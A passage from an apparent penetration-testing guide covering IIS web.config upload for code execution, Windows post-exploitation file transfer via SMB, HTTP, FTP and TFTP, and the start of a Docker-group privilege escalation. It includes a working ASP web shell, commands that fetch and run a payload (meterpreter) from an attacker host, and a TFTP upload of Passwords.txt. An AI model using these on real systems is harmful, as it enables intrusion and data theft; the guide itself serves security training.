<p>Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
</div>
</section>
<section id="iis-web-config-upload">
<h4>IIS - Web.config Upload<a class="headerlink" href="#iis-web-config-upload" title="Link to this heading"></a></h4>
<p>If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.</p>
<p>A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.</p>
<p>With a web.config file, you can control:</p>
<ul class="simple">
<li><p>Database connection strings.</p></li>
<li><p>Error behavior.</p></li>
<li><p>Security.</p></li>
</ul>
<p>Refer <a class="reference external" href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">Upload a web.config File for Fun &amp; Profit</a> and <a class="reference external" href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">RCE by uploading a web.config</a></p>
<p>We can upload the below web.config</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;configuration&gt;
  &lt;system.webServer&gt;
     &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
        &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
     &lt;/handlers&gt;
     &lt;security&gt;
        &lt;requestFiltering&gt;
           &lt;fileExtensions&gt;
              &lt;remove fileExtension=&quot;.config&quot; /&gt;
           &lt;/fileExtensions&gt;
           &lt;hiddenSegments&gt;
              &lt;remove segment=&quot;web.config&quot; /&gt;
           &lt;/hiddenSegments&gt;
        &lt;/requestFiltering&gt;
     &lt;/security&gt;
  &lt;/system.webServer&gt;
&lt;/configuration&gt;
&lt;%
set cmd = Request.QueryString(&quot;cmd&quot;)
Set os = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
output = os.exec(&quot;cmd.exe /c &quot; + cmd).stdout.readall
response.write output
%&gt;
</pre></div>
</div>
<p>The above expects a parameter cmd which is executed using wscript.shell and can be executed like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/uploads/web.config?cmd=whoami
</pre></div>
</div>
</section>
</section>
</section>
<section id="appendix-iii-transferring-files-from-linux-to-windows-post-exploitation">
<span id="a3-tranfer-files-from-linux-to-windows"></span><h2>Appendix-III Transferring Files from Linux to Windows (post-exploitation)<a class="headerlink" href="#appendix-iii-transferring-files-from-linux-to-windows-post-exploitation" title="Link to this heading"></a></h2>
<p>There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from <a class="reference external" href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/">Transferring Files from Linux to Windows (post-exploitation)</a> Here are the few methods</p>
<section id="smb">
<h3>SMB<a class="headerlink" href="#smb" title="Link to this heading"></a></h3>
<p>We need to setup a SMB Server on the Debian/ Kali machine</p>
<section id="smb-server-attacker">
<h4>SMB Server - Attacker<a class="headerlink" href="#smb-server-attacker" title="Link to this heading"></a></h4>
<p>We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>/usr/share/doc/python-impacket/examples/smbserver.py
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
                   shareName sharePath

This script will launch a SMB Server and add a share specified as an argument.
You need to be root in order to bind to port 445. No authentication will be
enforced. Example: smbserver.py -comment &#39;My share&#39; TMP /tmp

positional arguments:
 shareName         name of the share to add
 sharePath         path of the share to add

optional arguments:
 -h, --help        show this help message and exit
 -comment COMMENT  share&#39;s comment to display when asked for shares
 -debug            Turn DEBUG output ON
 -smb2support      SMB2 Support (experimental!)
</pre></div>
</div>
<p>So, we can setup by using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">smbserver</span><span class="o">.</span><span class="n">py</span> <span class="n">SHELLS</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">SHELLS</span>

<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.15</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Callback</span> <span class="n">added</span> <span class="k">for</span> <span class="n">UUID</span> <span class="mi">4</span><span class="n">B324FC8</span><span class="o">-</span><span class="mi">1670</span><span class="o">-</span><span class="mi">01</span><span class="n">D3</span><span class="o">-</span><span class="mi">1278</span><span class="o">-</span><span class="mi">5</span><span class="n">A47BF6EE188</span> <span class="n">V</span><span class="p">:</span><span class="mf">3.0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Callback</span> <span class="n">added</span> <span class="k">for</span> <span class="n">UUID</span> <span class="mi">6</span><span class="n">BFFD098</span><span class="o">-</span><span class="n">A112</span><span class="o">-</span><span class="mi">3610</span><span class="o">-</span><span class="mi">9833</span><span class="o">-</span><span class="mi">46</span><span class="n">C3F87E345A</span> <span class="n">V</span><span class="p">:</span><span class="mf">1.0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
</pre></div>
</div>
</section>
<section id="accessing-the-share-linux">
<h4>Accessing the share - Linux<a class="headerlink" href="#accessing-the-share-linux" title="Link to this heading"></a></h4>
<p>We can use smbclient to access the share</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>smbclient -L 10.10.10.10 --no-pass
WARNING: The &quot;syslog&quot; option is deprecated

       Sharename       Type      Comment
       ---------       ----      -------
       IPC$            Disk
       SHELLS          Disk
 Reconnecting with SMB1 for workgroup listing.
 Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
 Failed to connect with SMB1 -- no workgroup available
</pre></div>
</div>
</section>
<section id="accessing-the-share-windows">
<h4>Accessing the share - Windows<a class="headerlink" href="#accessing-the-share-windows" title="Link to this heading"></a></h4>
<p>We can use net view to check the shares</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">view</span> \\<span class="mf">10.10.10.10</span>

<span class="n">Shared</span> <span class="n">resources</span> <span class="n">at</span> \\<span class="mf">10.10.10.10</span>

<span class="p">(</span><span class="n">null</span><span class="p">)</span>

<span class="n">Share</span> <span class="n">name</span> <span class="n">Type</span> <span class="n">Used</span> <span class="k">as</span> <span class="n">Comment</span>
<span class="o">-------------------------------</span>
<span class="n">SHELLS</span>     <span class="n">Disk</span>
<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">sucessfully</span>
</pre></div>
</div>
</section>
<section id="copying-the-files-windows">
<h4>Copying the Files - Windows<a class="headerlink" href="#copying-the-files-windows" title="Link to this heading"></a></h4>
<p>From the Windows Command Prompt</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>

<span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
<span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="ow">is</span> <span class="n">ABCD</span><span class="o">-</span><span class="n">EFAA</span>

<span class="n">Directory</span> <span class="n">of</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>

<span class="mi">04</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">47</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
<span class="mi">04</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">25</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
<span class="mi">04</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">47</span> <span class="n">AM</span>            <span class="mi">73</span><span class="p">,</span><span class="mi">802</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
              <span class="mi">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>        <span class="mi">101</span><span class="p">,</span><span class="mi">696</span> <span class="nb">bytes</span>
              <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">15</span><span class="p">,</span><span class="mi">207</span><span class="p">,</span><span class="mi">469</span><span class="p">,</span><span class="mi">056</span> <span class="nb">bytes</span> <span class="n">free</span>
</pre></div>
</div>
<p>We can directly copy the file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">bitvijays</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">copy</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="o">.</span>
       <span class="mi">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="o">.</span>
</pre></div>
</div>
<p>or directly execute it without copying</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>\\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span>

<span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="n">can</span> <span class="n">be</span> <span class="n">your</span> <span class="n">meterpreter</span> <span class="n">exe</span>
</pre></div>
</div>
</section>
</section>
<section id="id41">
<h3>HTTP<a class="headerlink" href="#id41" title="Link to this heading"></a></h3>
<section id="setting-up-the-server">
<h4>Setting up the Server<a class="headerlink" href="#setting-up-the-server" title="Link to this heading"></a></h4>
<p>We can use python-SimpleHTTPServer to set up a HTTP Web Server</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span>
</pre></div>
</div>
</section>
<section id="accessing-the-server-windows">
<h4>Accessing the Server - Windows<a class="headerlink" href="#accessing-the-server-windows" title="Link to this heading"></a></h4>
<p><strong>Windows Command Prompt</strong></p>
<p>We can use powershell to download a file from a command prompt</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.10.10:8000/ps.exe&#39;,&#39;C:\Users</span><span class="se">\b</span><span class="s2">itvijays\Desktop\ps.exe&#39;)&quot;</span>
</pre></div>
</div>
<p><strong>CertUtil</strong></p>
<p>CertUtil command can be abused to download a file from internet.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">certutil</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="s2">&quot;https://download.sysinternals.com/files/PSTools.zip&quot;</span> <span class="n">pstools</span><span class="o">.</span><span class="n">zip</span>
</pre></div>
</div>
<p><strong>Bitsadmin</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">bitsadmin</span> <span class="o">/</span><span class="n">transfer</span> <span class="n">myDownloadJob</span> <span class="o">/</span><span class="n">download</span> <span class="o">/</span><span class="n">priority</span> <span class="n">normal</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="n">c</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">bitvijays</span>\<span class="n">Desktop</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
</pre></div>
</div>
</section>
</section>
<section id="ftp">
<h3>FTP<a class="headerlink" href="#ftp" title="Link to this heading"></a></h3>
<p>We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>While downloading files from ftp, remember to switch to binary mode, otherwise the file could be corrupted.</p>
</div>
<section id="id42">
<h4>Setting up the Server<a class="headerlink" href="#id42" title="Link to this heading"></a></h4>
<p>We can either use Python-pyftpdlib or Metasploit to create a FTP Server</p>
<p><strong>Python-pyftpdlib</strong></p>
<p>Install using apt</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">python</span><span class="o">-</span><span class="n">pyftpdlib</span>
</pre></div>
</div>
<p>Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>/home/bitvijays/SHELLS$ python -m pyftpdlib -p 21

Usage: python -m pyftpdlib [options]

Start a stand alone anonymous FTP server.

Options:
 -h, --help : show this help message and exit
 -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
 -p PORT, --port=PORT : specify port number to run on (default 2121)
 -w, --write :  grants write access for logged in user (default read-only)
 -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
 -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
 -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
 -D, --debug : enable DEBUG logging evel
 -v, --version : print pyftpdlib version and exit
 -V, --verbose : activate a more verbose logging
 -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
 -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
</pre></div>
</div>
<p><strong>Metasploit</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Name</span><span class="p">:</span> <span class="n">FTP</span> <span class="n">File</span> <span class="n">Server</span>
<span class="n">Module</span><span class="p">:</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">ftp</span>
<span class="n">License</span><span class="p">:</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">License</span> <span class="p">(</span><span class="n">BSD</span><span class="p">)</span>
<span class="n">Rank</span><span class="p">:</span> <span class="n">Normal</span>

<span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
<span class="n">hdm</span> <span class="o">&lt;</span><span class="n">x</span><span class="nd">@hdm</span><span class="o">.</span><span class="n">io</span><span class="o">&gt;</span>

<span class="n">Available</span> <span class="n">actions</span><span class="p">:</span>
<span class="n">Name</span>     <span class="n">Description</span>
<span class="o">----</span>     <span class="o">-----------</span>
<span class="n">Service</span>

<span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
<span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
<span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
<span class="n">FTPPASS</span>                    <span class="n">no</span>        <span class="n">Configure</span> <span class="n">a</span> <span class="n">specific</span> <span class="n">password</span> <span class="n">that</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">access</span>
<span class="n">FTPROOT</span>   <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftproot</span>     <span class="n">yes</span>       <span class="n">The</span> <span class="n">FTP</span> <span class="n">root</span> <span class="n">directory</span> <span class="n">to</span> <span class="n">serve</span> <span class="n">files</span> <span class="kn">from</span>
<span class="nn">FTPUSER</span>                    <span class="n">no</span>        <span class="n">Configure</span> <span class="n">a</span> <span class="n">specific</span> <span class="n">username</span> <span class="n">that</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">access</span>
<span class="n">PASVPORT</span>  <span class="mi">0</span>                <span class="n">no</span>        <span class="n">The</span> <span class="n">local</span> <span class="n">PASV</span> <span class="n">data</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="p">(</span><span class="mi">0</span> <span class="ow">is</span> <span class="n">random</span><span class="p">)</span>
<span class="n">SRVHOST</span>   <span class="mf">0.0.0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="n">This</span> <span class="n">must</span> <span class="n">be</span> <span class="n">an</span> <span class="n">address</span> <span class="n">on</span> <span class="n">the</span> <span class="n">local</span> <span class="n">machine</span> <span class="ow">or</span> <span class="mf">0.0.0.0</span>
<span class="n">SRVPORT</span>   <span class="mi">21</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
<span class="n">SSL</span>       <span class="n">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span> <span class="k">for</span> <span class="n">incoming</span> <span class="n">connections</span>
<span class="n">SSLCert</span>                    <span class="n">no</span>        <span class="n">Path</span> <span class="n">to</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">SSL</span> <span class="n">certificate</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="n">randomly</span> <span class="n">generated</span><span class="p">)</span>

<span class="n">Description</span><span class="p">:</span>
<span class="n">This</span> <span class="n">module</span> <span class="n">provides</span> <span class="n">a</span> <span class="n">FTP</span> <span class="n">service</span>
</pre></div>
</div>
</section>
<section id="access-using-ftp">
<h4>Access using FTP<a class="headerlink" href="#access-using-ftp" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ftp</span> <span class="mf">10.10.10.10</span>
<span class="n">Connected</span> <span class="n">to</span> <span class="mf">10.10.10.10</span><span class="o">.</span>
<span class="mi">220</span> <span class="n">FTP</span> <span class="n">Server</span> <span class="n">Ready</span>
<span class="n">Name</span> <span class="p">(</span><span class="n">localhost</span><span class="p">:</span><span class="n">root</span><span class="p">):</span> <span class="n">anonymous</span>
<span class="mi">331</span> <span class="n">User</span> <span class="n">name</span> <span class="n">okay</span><span class="p">,</span> <span class="n">need</span> <span class="n">password</span><span class="o">...</span>
<span class="n">Password</span><span class="p">:</span>
<span class="mi">230</span> <span class="n">Login</span> <span class="n">OK</span>
<span class="n">Remote</span> <span class="n">system</span> <span class="nb">type</span> <span class="ow">is</span> <span class="n">UNIX</span><span class="o">.</span>
<span class="n">Using</span> <span class="n">binary</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">transfer</span> <span class="n">files</span><span class="o">.</span>

<span class="n">ftp</span><span class="o">&gt;</span> <span class="n">ls</span>
<span class="mi">200</span> <span class="n">PORT</span> <span class="n">command</span> <span class="n">successful</span><span class="o">.</span>
<span class="mi">150</span> <span class="n">Opening</span> <span class="n">ASCII</span> <span class="n">mode</span> <span class="n">data</span> <span class="n">connection</span> <span class="k">for</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ls</span>
<span class="n">total</span> <span class="mi">160</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">512</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">512</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="o">.</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">166</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
<span class="mi">226</span> <span class="n">Transfer</span> <span class="n">complete</span><span class="o">.</span>

<span class="n">ftp</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
<span class="n">local</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span> <span class="n">remote</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
<span class="mi">200</span> <span class="n">PORT</span> <span class="n">command</span> <span class="n">successful</span><span class="o">.</span>
<span class="mi">150</span> <span class="n">Opening</span> <span class="n">BINARY</span> <span class="n">mode</span> <span class="n">data</span> <span class="n">connection</span> <span class="k">for</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
<span class="mi">226</span> <span class="n">Transfer</span> <span class="n">complete</span><span class="o">.</span>
<span class="mi">166</span> <span class="nb">bytes</span> <span class="n">received</span> <span class="ow">in</span> <span class="mf">0.00</span> <span class="n">secs</span> <span class="p">(</span><span class="mf">138.4367</span> <span class="n">kB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
<span class="n">ftp</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>FTP can also accepts a series of commands stored in a text file</p>
<p>Contents of a text file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">open</span> <span class="mf">10.10.10.10</span>
<span class="n">anonymous</span>
<span class="n">anonymous</span>
<span class="n">binary</span>
<span class="n">get</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
<span class="n">bye</span>
</pre></div>
</div>
<p>Passing parameter to ftp</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ftp</span> <span class="o">-</span><span class="n">s</span><span class="p">:</span><span class="n">filename</span><span class="o">-</span><span class="n">containing</span><span class="o">-</span><span class="n">commands</span>
</pre></div>
</div>
<p>The file can be created by using echo</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;open 10.10.10.10&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">commands</span><span class="o">.</span><span class="n">txt</span>
<span class="n">echo</span> <span class="s2">&quot;anonymous&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">commands</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</section>
</section>
<section id="tftp">
<h3>TFTP<a class="headerlink" href="#tftp" title="Link to this heading"></a></h3>
<p>We can also utilize TFTP to download or upload files</p>
<section id="id43">
<h4>Setting up the Server<a class="headerlink" href="#id43" title="Link to this heading"></a></h4>
<p>Metasploit module</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>

      <span class="n">Name</span><span class="p">:</span> <span class="n">TFTP</span> <span class="n">File</span> <span class="n">Server</span>
    <span class="n">Module</span><span class="p">:</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span>
   <span class="n">License</span><span class="p">:</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">License</span> <span class="p">(</span><span class="n">BSD</span><span class="p">)</span>
      <span class="n">Rank</span><span class="p">:</span> <span class="n">Normal</span>

<span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
 <span class="n">jduck</span> <span class="o">&lt;</span><span class="n">jduck</span><span class="nd">@metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
 <span class="n">todb</span> <span class="o">&lt;</span><span class="n">todb</span><span class="nd">@metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>

<span class="n">Available</span> <span class="n">actions</span><span class="p">:</span>
 <span class="n">Name</span>     <span class="n">Description</span>
 <span class="o">----</span>     <span class="o">-----------</span>
 <span class="n">Service</span>

<span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
 <span class="n">Name</span>        <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
 <span class="o">----</span>        <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
 <span class="n">OUTPUTPATH</span>  <span class="o">/</span><span class="n">tmp</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">directory</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">uploaded</span> <span class="n">files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">written</span><span class="o">.</span>
 <span class="n">SRVHOST</span>     <span class="mf">0.0.0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
 <span class="n">SRVPORT</span>     <span class="mi">69</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
 <span class="n">TFTPROOT</span>    <span class="o">/</span><span class="n">tmp</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">TFTP</span> <span class="n">root</span> <span class="n">directory</span> <span class="n">to</span> <span class="n">serve</span> <span class="n">files</span> <span class="kn">from</span>

<span class="nn">Description</span><span class="p">:</span>
 <span class="n">This</span> <span class="n">module</span> <span class="n">provides</span> <span class="n">a</span> <span class="n">TFTP</span> <span class="n">service</span>

<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">running</span> <span class="k">as</span> <span class="n">background</span> <span class="n">job</span> <span class="mf">0.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">TFTP</span> <span class="n">server</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mf">69.</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">served</span> <span class="kn">from</span> <span class="o">/</span><span class="n">tmp</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploaded</span> <span class="n">files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">tmp</span>
</pre></div>
</div>
</section>
<section id="accessing-the-share">
<h4>Accessing the Share<a class="headerlink" href="#accessing-the-share" title="Link to this heading"></a></h4>
<p>Downloading a file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tftp</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.10.10</span> <span class="n">GET</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
</pre></div>
</div>
<p>Uploading a file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tftp</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.10.10</span> <span class="n">PUT</span> <span class="n">Passwords</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</section>
<section id="installing-tftp-windows">
<h4>Installing tftp - Windows<a class="headerlink" href="#installing-tftp-windows" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pkgmgr</span> <span class="o">/</span><span class="n">iu</span><span class="p">:</span><span class="s2">&quot;TFTP&quot;</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="appendix-iv-linux-group-membership-issues">
<span id="a4-linux-group-membership-issues"></span><h2>Appendix-IV Linux Group Membership Issues<a class="headerlink" href="#appendix-iv-linux-group-membership-issues" title="Link to this heading"></a></h2>
<p>Let’s examine in what groups we are members. Recommended read about groups: <a class="reference external" href="https://wiki.archlinux.org/index.php/users_and_groups">Users and Groups</a> and <a class="reference external" href="https://wiki.debian.org/SystemGroups">System Groups</a></p>
<section id="docker-group">
<h3>Docker Group<a class="headerlink" href="#docker-group" title="Link to this heading"></a></h3>
<p>Any user who is part of the docker group should also be considered root. Read <a class="reference external" href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host">Using the docker command to root the host</a> Older version of docker were vulnerable to Docker breakout. More details at <a class="reference external" href="https://github.com/gabrtv/shocker">Shocker / Docker Breakout PoC</a></p>
<p>If you are the docker user and want to get root.</p>
<section id="create-a-dockerfile">
